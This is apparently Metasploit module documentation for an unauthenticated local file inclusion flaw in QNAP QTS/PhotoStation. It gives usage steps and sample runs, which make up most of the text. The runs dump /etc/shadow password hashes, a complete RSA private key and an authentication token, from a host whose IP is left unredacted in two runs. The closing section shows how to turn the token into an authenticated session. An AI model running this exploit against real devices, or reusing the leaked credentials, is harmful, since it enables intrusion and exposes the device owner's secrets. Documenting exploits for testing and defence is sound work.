## Vulnerable Application

### Introduction

This module abuses a vulnerability in QNAP QTS and PhotoStation that allows an
unauthenticated user to download files off the file system, and because the server
runs as root, it's possible to include sensitive files, including ssh private keys and
password hashes.

`/etc/shadow` entries can be processed offline, the module saves them in the creds,
and they can be cracked using john the ripper, or hashcat.

There is some confusion in the CVEs assigned to this vulnerability, it corresponds to
one of these : CVE-2019-7192, CVE-2019-7194 or CVE-2019-7195, notice that two of them
have the same description.


## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/gather/qnap_lfi`
3. Do: `set RHOSTS [RHOSTS]`
4. Do: `check`
6. Verify if `check` detects vulnerable hosts as it should
7. Do: `run`
8. Do: `loot`
9. Verify if the run command retrieved the content of /etc/shadow if the host was vulnerable, and saved the file in the loot
10. Do: `creds`
11. Verify if the retrieved hashes were saved in the creds, and their hash type identified correctly.

## Options

### FILEPATH

Set this to the file you want to dump. The default is `/etc/shadow`.

### PRINT

Whether to print file contents to the screen, defaults to true.

## Scenarios

### QNAP QTS 4.3.3

#### Dumping hashes from `/etc/shadow`

```
msf5 auxiliary(gather/qnap_lfi) > run
[*] Running module against [REDACTED]

[*] Getting the Album Id
[+] Got Album Id : cJinsP
[*] Getting the Access Code
[+] Got Access Code : NjU1MzR8MXwxNTkwNjk0MDIy
[*] Attempting Local File Inclusion
[+] File download successful, file saved in /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin
[+] File content:
admin:$1$$CoERg7ynjYLsj2j4glJ34.:14233:0:99999:7:::
guest:$1$$ysap7EeB9ODCrO46Psdbq/:14233:0:99999:7:::
httpdusr:!:16762:0:99999:7:::
Redouane:$1$$EBquHgqfhZQKEdjd8dqWh1:16935:0:99999:7:::
[sshd]:!:17496:0:99999:7:::
[appuser]:!:18036:0:99999:7:::
af4de148:$1$$Wb6XAeBxv2R5HfU8uyZc.1:18407:0:99999:7:::
[*] adding the /etc/shadow entries to the database
[*] Auxiliary module execution completed
msf5 auxiliary(gather/qnap_lfi) > loot

Loot
====

host           service  type       name    content                   info  path
----           -------  ----       ----    -------                   ----  ----
[REDACTED]              qnap.http  shadow  application/octet-stream        /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin

msf5 auxiliary(gather/qnap_lfi) > 

```

#### Dumping ssh private keys

```
msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /root/.ssh/id_rsa
FILEPATH => /root/.ssh/id_rsa
msf5 auxiliary(gather/qnap_lfi) > exploit 
[*] Running module against 62.46.219.229

[*] Getting the Album Id
[+] Got Album Id : cJinsP
[*] Getting the Access Code
[+] Got Access Code : NjU1MzR8MXwxNTkwNjk0MjE1
[*] Attempting Local File Inclusion
[+] File download successful, file saved in /home/redouane/.msf4/loot/20200528213018_default_62.46.219.229_qnap.http_983860.bin
[+] File content:
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtKUCApMRysMNtXwybkPvBL7TY4w/gSZ7k0TN6JkNXMUVI2oM
euNvkII/xxRmOO9IFenpoOFzCr3xlWWm7qsHON5DDJ+e24HC/C8uPISY0klBn+JD
ddKgQl4ebUToEaKJU+uPiAfDkHO2qh1q6DMnbHRQ39QHyw1W1UhegjCNDAQiLJ8Q
jsITJD6j4VxsjUeginnPD/Rt5hcM9pmYn580A2b4s1P1XN5JzpPGcZ015Y7XUXVu
Xg7G4uq+fi8TTKJyqCS81W//TwX3SBzEzSecxU7whMF8Xaa6WiZl1pj/4llKZnIJ
y49DKOKEMdwa7SEJgyuVZiF+vsu6yk3ES/MY1wIDAQABAoIBACVKfvy7EYwy8eyK
I/sBSSFIp2jAdgeaQx5msL8YgVqqUK/L36Gqu8gwKyxUuLl+I/pqHFGa2N3Z0jpO
DsTsR4Rk1aCQfwG/atoWf0v873NRrhtsYRK8lVq+BTf3ZpTlYcYSNcIWIDf8uzOo
+P3QOY45AM0D/0vaiBdlZiUoEqXtB6fybwvNj2uqq1uzv0E0liTb/HtqR2Ai4fHZ
ECs0TdTlIfF9vC8kO1ItCOY4pDr06/xgMhGKAnJsgVggRicDUXovnskugqJG9BqO
sNB8i+R309YiF6/T79pzjAEqxNKcZ+5ckn3QOMrBnsj5Yi/3iDYnYK7y2WB6phnM
JJ8pI3kCgYEA4CzcDOHXnQ4BD2zNPYdFv1UPfuB2WL0nOUBPh/7Z87CflMftMeHS
k5rFxvM33Zdq5a5MEkUTpkC79ID6mVKJd3HT/AaYIvCiYJDbKHYlbrLaHChc0t9a
qvmNA244EbPdm/2r7g68PhEXYGnnHDq+FQ5duyA0yqcSm0QP6+3lK4MCgYEAzkof
8SVh/UN7auUWnIv2H1J6PUZHjXDzRPLDz5FqYrhpSu4mt7tzDoFNwpP1A3cV3eVP
f60yrwQH7U4a6DtaC72gh7kdYogtY1UD+UOWX1Ocd0083zJGPO9Xbnd2yS5nMnQe
I0LpynjWmLDZhENHrzm3rcL9tV+IZ/gv6RHvOR0CgYBI4sz480TjL3ZwyXNBmgW3
W7SaD+jqmTVzi9FP6jB65uY7vXUFTuLkUuIS+WkkhuKeorjhB8yHtWxm5riTuR4w
07WUr6AvXAWvV+mpkiBBia0Ykpb7iNs108VhZCieuNhIq4WG9QuHMo9jLYuSxhaf
Sfh3qtT/PqryCIMUtlhYeQKBgD8hQBU0M4CmHibgZMMTsgZz3yTRVSRb5Ja9FF95
SO1dMhvUNdUUcGmH+JwLW3fsAa0ed+3CuzgEK8jbljBruWrOZUojxHJa6kjzw3uM
y3/wvnlkEbTcVdJgDImp1ZhLsxkln/N6jsF/qWyg8nAfhtiA+U0b1ziiO8RVl5Pk
ASmhAoGBANIaI7/PzJwc+VevrWTzd8cakF9h8OseG6hIK5Hz3B9YpvfLqe0qWfeU
tfdh+WpFqQycJdz2RimVDhSAKhnHy3dkzHmuGnN55UmFqX/eDe5WCoxk7QP98W+y
ECvSmTESX+vkqMq5sbzBxAf6TAw+i14eH4CgEsGnc0ui7ri5CU6y
-----END RSA PRIVATE KEY-----
[*] Auxiliary module execution completed
msf5 auxiliary(gather/qnap_lfi) > 
```

#### Retrieving the token, can be used to authenticate

```
msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /share/Multimedia/.@__thumb/ps.app.token
FILEPATH => /share/Multimedia/.@__thumb/ps.app.token
msf5 auxiliary(gather/qnap_lfi) > exploit 
[*] Running module against 62.46.219.229

[*] Getting the Album Id
[+] Got Album Id : cJinsP
[*] Getting the Access Code
[+] Got Access Code : NjU1MzR8MXwxNTkwNjk0MzUw
[*] Attempting Local File Inclusion
[+] File download successful, file saved in /home/redouane/.msf4/loot/20200528213233_default_62.46.219.229_qnap.http_815651.bin
[+] File content:
8f9825b4410aaa3bc128865b6a1e75a6
[*] Auxiliary module execution completed
msf5 auxiliary(gather/qnap_lfi) > 
```

The token can then be used to authenticate, by sending a POST request to the uri `/cgi-bin/authLogin.cgi`, for the example above:

sending the POST payload: `app_token=8f9825b4410aaa3bc128865b6a1e75a6&app=PHOTO_STATION&auth=1`

This would return an `authSid`, that can be used with most endpoints that require authentication.
